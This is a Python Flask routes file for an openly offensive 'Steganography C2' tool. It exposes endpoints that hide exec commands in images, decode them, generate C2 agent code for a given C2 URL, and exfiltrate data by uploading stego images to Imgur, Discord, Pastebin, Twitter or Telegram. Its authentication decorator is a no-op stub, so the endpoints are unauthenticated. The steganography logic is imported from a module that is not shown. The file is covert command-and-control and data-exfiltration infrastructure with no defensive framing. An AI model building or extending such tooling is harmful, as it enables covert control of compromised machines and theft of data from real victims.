"""
Steganography C2 - Flask Routes
Covert command & control via image steganography
"""

from flask import Blueprint, render_template, request, jsonify, send_file
from functools import wraps
import sys
import os
import base64
import io
import hashlib
import tempfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'tools'))

# Simple pass-through decorator (auth handled elsewhere)
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        return f(*args, **kwargs)
    return decorated

try:
    from stego_c2 import (
        get_stego_c2, StegoMethod, ExfilTarget, C2Command, StegoImage,
        JA4RiskResult, RiskStatus
    )
    HAS_STEGO = True
except ImportError:
    HAS_STEGO = False
    get_stego_c2 = None
    StegoMethod = None
    ExfilTarget = None

stego_bp = Blueprint('stego_c2', __name__, url_prefix='/stego')


@stego_bp.route('/')
@login_required
def index():
    """Steganography C2 main page"""
    return render_template('stego_c2.html')


@stego_bp.route('/api/encode', methods=['POST'])
@login_required
def encode_message():
    """Encode message into image"""
    if not HAS_STEGO or not get_stego_c2:
        return jsonify({"error": "Stego C2 module not available"}), 500
    
    data = request.get_json()
    image_data = data.get('image')
    message = data.get('message')
    method = data.get('method', 'lsb_simple')
    encryption_key = data.get('key')
    
    if not image_data or not message:
        return jsonify({"error": "Image and message required"}), 400
    
    stego = get_stego_c2()
    
    try:
        method_enum = StegoMethod(method)
    except (ValueError, TypeError):
        method_enum = StegoMethod.LSB_SIMPLE
    
    if ',' in image_data:
        image_bytes = base64.b64decode(image_data.split(',')[-1])
    else:
        image_bytes = base64.b64decode(image_data)
    
    import tempfile
    with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as tmp:
        tmp.write(image_bytes)
        input_path = tmp.name
    
    with tempfile.NamedTemporaryFile(delete=False, suffix='_stego.png') as tmp:
        output_path = tmp.name
    
    cmd = C2Command(
        command_id=hashlib.md5(message.encode()).hexdigest()[:8],
        command_type="exec",
        payload=message,
        encrypted=True
    )
    
    result_path = stego.encode_command(cmd, input_path, output_path, method_enum)
    os.unlink(input_path)
    
    if result_path:
        with open(result_path, 'rb') as f:
            encoded_b64 = base64.b64encode(f.read()).decode()
        os.unlink(result_path)
        return jsonify({
            "success": True,
            "encoded_image": f"data:image/png;base64,{encoded_b64}",
        })
    return jsonify({"error": "Encoding failed"}), 500


@stego_bp.route('/api/decode', methods=['POST'])
@login_required
def decode_message():
    """Decode message from image"""
    if not HAS_STEGO or not get_stego_c2:
        return jsonify({"error": "Stego C2 module not available"}), 500
    
    data = request.get_json()
    image_data = data.get('image')
    method = data.get('method', 'lsb_simple')
    encryption_key = data.get('key')
    
    if not image_data:
        return jsonify({"error": "Image required"}), 400
    
    try:
        method_enum = StegoMethod(method)
    except (ValueError, TypeError):
        method_enum = StegoMethod.LSB_SIMPLE
    
    if ',' in image_data:
        image_bytes = base64.b64decode(image_data.split(',')[-1])
    else:
        image_bytes = base64.b64decode(image_data)
    
    import tempfile
    with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as tmp:
        tmp.write(image_bytes)
        tmp_path = tmp.name
    
    stego = get_stego_c2()
    cmd = stego.decode_command(tmp_path, encryption_key)
    os.unlink(tmp_path)
    
    if cmd:
        return jsonify({"success": True, "command": cmd.command_type, "payload": cmd.payload})
    return jsonify({"success": False, "error": "No command found"})


@stego_bp.route('/api/capacity', methods=['POST'])
@login_required
def check_capacity():
    """Check image capacity for steganography"""
    if not HAS_STEGO or not get_stego_c2:
        return jsonify({"error": "Stego C2 module not available"}), 500
    
    data = request.get_json()
    image_data = data.get('image')
    
    if not image_data:
        return jsonify({"error": "Image required"}), 400
    
    if ',' in image_data:
        image_bytes = base64.b64decode(image_data.split(',')[-1])
    else:
        image_bytes = base64.b64decode(image_data)
    
    import tempfile
    with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as tmp:
        tmp.write(image_bytes)
        tmp_path = tmp.name
    
    stego = get_stego_c2()
    capacity = stego.calculate_capacity(tmp_path)
    os.unlink(tmp_path)
    
    return jsonify({"capacity_bytes": capacity})


@stego_bp.route('/api/generate-agent', methods=['POST'])
@login_required
def generate_agent():
    """Generate stego C2 agent"""
    if not get_stego_c2:
        return jsonify({"error": "Stego C2 module not available"}), 500
    
    data = request.get_json()
    c2_url = data.get('c2_url')
    target = data.get('platform', 'imgur')
    encryption_key = data.get('key')
    language = data.get('language', 'python')
    
    if not c2_url:
        return jsonify({"error": "C2 URL required"}), 400
    
    stego = get_stego_c2()
    
    try:
        target_enum = ExfilTarget(target)
    except (ValueError, TypeError):
        target_enum = ExfilTarget.IMGUR
    
    agent_code = stego.generate_agent_code()
    return jsonify({"agent_code": agent_code, "language": language})


@stego_bp.route('/api/exfil', methods=['POST'])
@login_required
def exfiltrate():
    """Exfiltrate data via steganography"""
    if not HAS_STEGO or not get_stego_c2:
        return jsonify({"error": "Stego C2 module not available"}), 500
    
    data = request.get_json()
    image_data = data.get('image')
    message = data.get('message')
    platform = data.get('platform', 'imgur')
    
    if not image_data or not message:
        return jsonify({"error": "Image and message required"}), 400
    
    stego = get_stego_c2()
    
    try:
        target_enum = ExfilTarget(platform)
    except (ValueError, TypeError):
        target_enum = ExfilTarget.IMGUR
    
    import tempfile
    if ',' in image_data:
        image_bytes = base64.b64decode(image_data.split(',')[-1])
    else:
        image_bytes = base64.b64decode(image_data)
    
    with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as tmp:
        tmp.write(image_bytes)
        cover_path = tmp.name
    
    url = stego.exfiltrate_data(message.encode(), "exfil", target_enum, cover_path)
    os.unlink(cover_path)
    
    return jsonify({"success": url is not None, "url": url or "Exfil failed"})


@stego_bp.route('/api/methods')
@login_required
def get_methods():
    """Get available steganography methods"""
    methods = [
        {"id": "lsb_simple", "name": "LSB Simple", "description": "Basic Least Significant Bit encoding"},
        {"id": "lsb_random", "name": "LSB Random", "description": "Random pixel selection LSB"},
        {"id": "lsb_encrypted", "name": "LSB Encrypted", "description": "Encrypted LSB with XOR"},
        {"id": "dct_jpeg", "name": "DCT JPEG", "description": "DCT coefficient modification"},
        {"id": "palette_png", "name": "Palette PNG", "description": "PNG palette manipulation"},
    ]
    return jsonify({"methods": methods})


@stego_bp.route('/api/platforms')
@login_required
def get_platforms():
    """Get available exfiltration platforms"""
    platforms = [
        {"id": "imgur", "name": "Imgur", "icon": "🖼️", "description": "Anonymous image hosting"},
        {"id": "discord", "name": "Discord", "icon": "💬", "description": "Discord CDN upload"},
        {"id": "pastebin", "name": "Pastebin", "icon": "📋", "description": "Base64 encoded paste"},
        {"id": "twitter", "name": "Twitter/X", "icon": "🐦", "description": "Image tweet"},
        {"id": "telegram", "name": "Telegram", "icon": "✈️", "description": "Telegram channel"},
    ]
    return jsonify({"platforms": platforms})


@stego_bp.route('/api/sessions')
@login_required
def get_sessions():
    """Get active C2 sessions"""
    if not HAS_STEGO or not get_stego_c2:
        return jsonify({"error": "Stego C2 module not available"}), 500
    
    stego = get_stego_c2()
    stats = stego.get_stats()
    return jsonify({"sessions": [], "stats": stats})
